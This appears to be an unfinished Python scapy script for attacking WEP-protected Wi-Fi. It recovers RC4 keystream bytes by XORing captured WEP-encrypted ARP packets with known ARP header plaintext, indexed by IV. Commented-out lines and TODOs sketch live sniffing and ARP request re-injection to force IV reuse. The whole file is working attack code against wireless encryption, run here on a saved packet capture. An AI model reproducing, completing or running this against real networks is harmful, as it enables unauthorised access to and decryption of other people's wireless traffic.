from scapy.all import *
import binascii

# Global variables
ARP_REQUEST_PATTERN = 'aaaa0300000008060001080006040001'
ARP_RESPONSE_PATTERN = 'aaaa0300000008060001080006040002'
keystreams = {}
re_injection_packet = None
arp_packets_captured = 0

# Don't think we want this cause then we can't keep track of how many packets we have
# t = AsyncSniffer()
# t.start()
# print("hey")
# results = t.stop()


def expand(x):
    yield x.name
    while x.payload:
        x = x.payload
        yield x.name


# TODO Continuously inject a captured ARP request packet into the network
#   Not sure if this is possible because the card might be locked while sniffing?
# 50% chance IV repeats after 5000 packets


def arp_monitor_callback(pkt):
    global re_injection_packet
    global arp_packets_captured
    if len(pkt) == 112 or len(pkt) == 110:
        # print(pkt[RadioTap].len)
        layers = list(expand(pkt))
        if '802.11 WEP packet' in layers:
            arp_packets_captured += 1
            # pkt.show()
            print(pkt.iv)
            print(pkt.wepdata)
            src_address = pkt.addr2
            bssid = pkt.addr1
            iv_bytes = binascii.hexlify(pkt.iv)
            iv_hexstring = iv_bytes.decode('UTF-8')
            data_bytes = binascii.hexlify(pkt.wepdata)
            data_hexstring = data_bytes.decode('UTF-8')[:32]
            data_dec = int(data_hexstring, 16)

            print(pkt.addr3)
            # ARP request
            if pkt.addr3 == 'ff:ff:ff:ff:ff:ff':
                if re_injection_packet is None:
                    re_injection_packet = pkt
                else:
                    # FIXME Have this on a new thread?
                    # FIXME Spawn the new thread once this is not None
                    # sendp(re_injection_packet, iface="wlp7s0")
                    print('blah')
                xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
                keystream_first_bytes = hex(xor)[2:]
                if iv_hexstring not in keystreams:
                    keystreams[iv_hexstring] = keystream_first_bytes
            # ARP response
            else:
                xor = data_dec ^ int(ARP_RESPONSE_PATTERN, 16)
                keystream_first_bytes = hex(xor)[2:]
                if iv_hexstring not in keystreams:
                    keystreams[iv_hexstring] = keystream_first_bytes


# sniff(iface="wlp7s0", prn=arp_monitor_callback, filter="arp", store=0)
# while arp_packets_captured < 35000:
    # sniff(iface="wlp7s0", prn=arp_monitor_callback, store=0)


scapy_cap = rdpcap('packets/arp_packet_dump.pcap')
for packet in scapy_cap:
    arp_monitor_callback(packet)

for key in keystreams:
    print(f'{key} - {keystreams[key]}')